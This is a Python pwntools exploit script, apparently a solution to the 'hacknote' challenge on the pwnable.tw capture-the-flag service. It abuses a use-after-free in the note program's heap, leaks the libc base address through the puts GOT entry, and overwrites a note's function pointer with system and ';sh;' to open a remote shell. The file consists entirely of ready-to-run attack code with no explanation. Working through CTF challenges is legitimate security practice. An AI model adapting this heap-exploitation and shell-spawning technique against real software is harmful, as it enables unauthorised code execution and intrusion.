#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

libc = ELF("./libc_32.so.6")

r = remote("chall.pwnable.tw", 10102)
#r = process('./hacknote', env = {"LD_PRELOAD": "./libc_32.so.6"})
#gdb.attach(proc.pidof(r)[0])

def add_note(size, content):
    print("add note :", size, content)
    r.sendlineafter(':', "1")
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', content)

def del_note(index):
    print("del note :", index)
    r.sendlineafter(':', "2")
    r.sendlineafter(':', str(index))

def print_note(index):
    print("print note :", index)
    r.sendlineafter(':', "3")
    r.sendlineafter('Index :', str(index))

print_note_content = 0x0804862b
puts_got = 0x804a024

# prepare for UAF
add_note(0x18, "jedi")
add_note(0x18, "jedi")
del_note(0)
del_note(1)

# leak libc base
add_note(8, flat([print_note_content, puts_got]))
print_note(0)
libc.address = u32(r.recvuntil(b'\n').strip()[:4].ljust(4, b'\x00')) - libc.symbols[b"puts"]
print("libc base:", hex(libc.address))

# system("{system_address here};sh;")
del_note(2)
add_note(8, p32(libc.symbols[b"system"]) + b";sh;")
print_note(0)

r.interactive()
